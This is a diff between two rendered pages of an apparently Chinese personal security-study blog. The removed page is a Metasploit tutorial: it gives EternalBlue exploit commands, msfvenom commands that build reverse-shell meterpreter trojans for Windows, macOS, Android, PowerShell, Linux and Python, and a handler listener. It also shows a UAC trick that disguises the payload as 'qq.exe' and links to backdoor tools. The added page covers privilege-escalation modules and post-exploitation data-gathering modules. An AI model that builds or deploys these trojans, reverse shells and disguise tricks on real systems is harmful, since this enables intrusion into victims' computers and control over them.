@@ -4,18 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="MSF框架以及使用, Broken-year">
-    <meta name="description" content="MSF框架以及使用msfconsole //打开msf
-
-
-在msf里可以使用别的工具，比如nmap
-
-nmap -sV [ip]  //扫描一下
-
-msf如果攻击对方需要条件：
-1.要有漏洞
-2.攻击载荷
-ms17010use explo">
+    <meta name="keywords" content="操作系统权限及信息采集, Broken-year">
+    <meta name="description" content="操作系统权限及信息采集系统权限windowssystemadministrator(others)
+linuxroot(others)
+计算机组成相关权限CPU:OS（操作系统——可以在其身上安装其他软件的软件，需要配合硬件）ring0 权">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -27,7 +19,7 @@ ms17010use explo">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>MSF框架以及使用 | Broken-year</title>
+    <title>操作系统权限及信息采集 | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -319,12 +311,12 @@ ms17010use explo">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">MSF框架以及使用</h1>
+                    <h1 class="description center-align post-title">操作系统权限及信息采集</h1>
                 </div>
             </div>
         </div>
@@ -440,20 +432,24 @@ ms17010use explo">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/msf/">
-                                <span class="chip bg-color">msf</span>
+                            <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
+                                <span class="chip bg-color">操作系统</span>
                             </a>
                         
-                            <a href="/tags/%E5%B7%A5%E5%85%B7/">
-                                <span class="chip bg-color">工具</span>
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
                             </a>
                         
-                            <a href="/tags/kali/">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/Windows/">
+                                <span class="chip bg-color">Windows</span>
                             </a>
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9D%83%E9%99%90/">
+                                <span class="chip bg-color">权限</span>
                             </a>
                         
                     </div>
@@ -498,90 +494,55 @@ ms17010use explo">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="MSF框架以及使用"><a href="#MSF框架以及使用" class="headerlink" title="MSF框架以及使用"></a>MSF框架以及使用</h1><pre><code>msfconsole //打开msf
-</code></pre>
-<blockquote>
-<p>在msf里可以使用别的工具，比如nmap</p>
-</blockquote>
-<pre><code>nmap -sV [ip]  //扫描一下
-</code></pre>
-<p>msf如果攻击对方需要条件：</p>
-<p>1.要有漏洞</p>
-<p>2.攻击载荷</p>
-<h2 id="ms17010"><a href="#ms17010" class="headerlink" title="ms17010"></a>ms17010</h2><pre><code>use exploit/windows/smb/ms17_010_eternalblue  //使用永恒之蓝漏洞
-show options   //查看需要的选项
-set RHOST [目标ip]
-run   //运行
-</code></pre>
-<h2 id="msf内网渗透"><a href="#msf内网渗透" class="headerlink" title="msf内网渗透"></a>msf内网渗透</h2><p>生成exe木马</p>
-<pre class=" language-Linux"><code class="language-Linux">在/root目录底下
-msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[本地ip] LPORT=[本地端口] -b "\00" -e x86/shikata_ga_nai -f exe >msf.exe
-</code></pre>
-<blockquote>
-<p>生成好之后下载到靶机</p>
-</blockquote>
-<p>在msf里建立木马的控制端</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST [本机ip]
-exploit  //进入监听状态
-background //暂时不操作，把木马放到后台
-sessions //查看控制多少人
-sessions -i 1 //进入1号主机的控制端
-jobs //查看目前在执行多少个任务
-back  //后退一格
-</code></pre>
-<p>当目标运行木马，在控制端就会上线</p>
-<h2 id="生成其他木马的命令"><a href="#生成其他木马的命令" class="headerlink" title="生成其他木马的命令"></a>生成其他木马的命令</h2><p>生成mac木马：</p>
-<pre><code>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho -o payload.macho
+                <h1 id="操作系统权限及信息采集"><a href="#操作系统权限及信息采集" class="headerlink" title="操作系统权限及信息采集"></a>操作系统权限及信息采集</h1><h2 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>system<br>administrator<br>(others)</p>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>root<br>(others)</p>
+<h2 id="计算机组成相关权限"><a href="#计算机组成相关权限" class="headerlink" title="计算机组成相关权限"></a>计算机组成相关权限</h2><p><strong>CPU:</strong><br><strong>OS</strong>（操作系统——可以在其身上安装其他软件的软件，需要配合硬件）<br><strong>ring0</strong> 权限（驱动程序）——需要学习windows ddk<br><strong>ring3</strong> 权限（大多数软件）</p>
+<p><strong>usb接口</strong>（硬件）</p>
+<p><strong>硬件编程</strong></p>
+<h2 id="操作系统提权："><a href="#操作系统提权：" class="headerlink" title="操作系统提权："></a>操作系统提权：</h2><p>msf：</p>
+<pre><code>ms14_058,ms16_016
+# 目标x32位系统
 
-# 老版本的mac
-</code></pre>
-<p>生成android木马（需要数字签名）：</p>
-<pre><code>msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f apk -o payload.apk
-</code></pre>
-<p>生成powershell木马：</p>
-<pre><code>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=自己ip LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
-</code></pre>
-<p>生成linux木马：</p>
-<pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf
-</code></pre>
-<p>生成python木马：</p>
-<pre><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py
-</code></pre>
-<h2 id="meterpreter操作"><a href="#meterpreter操作" class="headerlink" title="meterpreter操作:"></a>meterpreter操作:</h2><pre><code>首先进入对方电脑
-</code></pre>
-<h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><pre><code>getuid   //查看当前用户权限
-getsystem //直接提权（有风险的）
-考虑使用ask模块提权
-background 把木马放到后台
-use exploit/windows/local/ask   //加载ask模块
-info  查看信息
-set SESSION 1 使用漏洞在1号木马控制的目标上
-set FILENAME qq.exe  伪装成qq
-set LHOST [本机ip]
-exploit
-会在用户桌面上弹出一个允许qq启动，用户选择yes成功
-getuid发现不是system
-getsystem提高到最高
-</code></pre>
-<p>UAC权限</p>
-<p><img src="/2022/03/23/msf/image-20220109231015448.png" alt="image-20220109231015448"></p>
-<h3 id="UAC绕过提权-成功率不高"><a href="#UAC绕过提权-成功率不高" class="headerlink" title="UAC绕过提权(成功率不高)"></a>UAC绕过提权(成功率不高)</h3><pre><code>use exploit/windows/local/bypassuac # (多用来进攻32位系统)
+use exploit/windows/local/ms14_058...
 show options
-set SESSION 1
-exploit 开始攻击
-# 如果攻击成功，会给你一个新的session号
-# 进入新的session号
-getuid
-getsystem
+set session 1
+exploit
+# 如果使用成功会返回一个新的session号
 </code></pre>
-<h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p>胖老鼠，后门    </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a></p>
-<p>安卓payload</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/M4sc3r4n0/Evil-Droid">https://github.com/M4sc3r4n0/Evil-Droid</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/jbreed/apkinjector">https://github.com/jbreed/apkinjector</a></p>
+<p>较出名漏洞：</p>
+<p>cve<br>cnnvd</p>
+<p>……</p>
+<p><img src="/2022/03/23/system-passwd/image-20220109234619923.png" alt="image-20220109234619923"></p>
+<h2 id="目标信息采集："><a href="#目标信息采集：" class="headerlink" title="目标信息采集："></a>目标信息采集：</h2><p>msf</p>
+<p>需要进入到一个sessions里</p>
+<pre><code>run post/windows/gather/forensics/xxxxx  # 取证模块
+
+run post/windows/gather/checkvm   # 检测是否为虚拟机
+
+run post/windows/gather/enum_services   # 查看运行的服务
+
+run post/windows/gather/enum_applications   # 查看电脑安装了哪些应用
+
+run post/windows/gather/enum_shares    # 查看共享
+
+run post/windows/gather/dumplinks   # 查看最近操作（安装东西）
+
+run post/windows/gather/enum_patches   # 查看用户安装了哪些补丁
+</code></pre>
+<pre><code>cd /usr/share/metasploit-framework/scripts/resource/   #可以看到大佬的脚本
+</code></pre>
+<pre><code>run scraper   # 导出所有信息
+
+run winenum   # 搜集系统环境变量
+</code></pre>
+<h2 id="数据包you-get捕获："><a href="#数据包you-get捕获：" class="headerlink" title="数据包you-get捕获："></a>数据包you-get捕获：</h2><p>流媒体，很难搞<br>安装python环境</p>
+<pre><code>pip install -i https://pypi.doubanio.com/simple you-get
+
+you-get -i [视频地址]
+
+看到视频所有支持的格式
+按照提示去下载视频
+</code></pre>
 
                 
             </div>
@@ -608,7 +569,7 @@ getsystem
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/23/msf/">http://Broken-year.github.io/2022/03/23/msf/</a>
+                    <a href="http://Broken-year.github.io/2022/03/23/system-passwd/">http://Broken-year.github.io/2022/03/23/system-passwd/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -646,20 +607,24 @@ getsystem
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/msf/">
-                                    <span class="chip bg-color">msf</span>
+                                <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
+                                    <span class="chip bg-color">操作系统</span>
                                 </a>
                             
-                                <a href="/tags/%E5%B7%A5%E5%85%B7/">
-                                    <span class="chip bg-color">工具</span>
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
                                 </a>
                             
-                                <a href="/tags/kali/">
-                                    <span class="chip bg-color">kali</span>
+                                <a href="/tags/Windows/">
+                                    <span class="chip bg-color">Windows</span>
                                 </a>
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9D%83%E9%99%90/">
+                                    <span class="chip bg-color">权限</span>
                                 </a>
                             
                         </div>
@@ -833,9 +798,10 @@ getsystem
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/23/system-passwd/">
                     <div class="card-image">
@@ -853,9 +819,9 @@ getsystem
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -868,6 +834,7 @@ getsystem
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -902,13 +869,13 @@ getsystem
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/23/web-vulnerability/">
+                <a href="/2022/03/23/msf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="web漏洞介绍">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="MSF框架以及使用">
                         
-                        <span class="card-title">web漏洞介绍</span>
+                        <span class="card-title">MSF框架以及使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -936,16 +903,20 @@ getsystem
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">网络安全</span>
+                    <a href="/tags/msf/">
+                        <span class="chip bg-color">msf</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
+                        <span class="chip bg-color">工具</span>
+                    </a>
+                    
+                    <a href="/tags/kali/">
+                        <span class="chip bg-color">kali</span>
                     </a>
                     
                     <a href="/tags/%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">漏洞</span>
-                    </a>
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
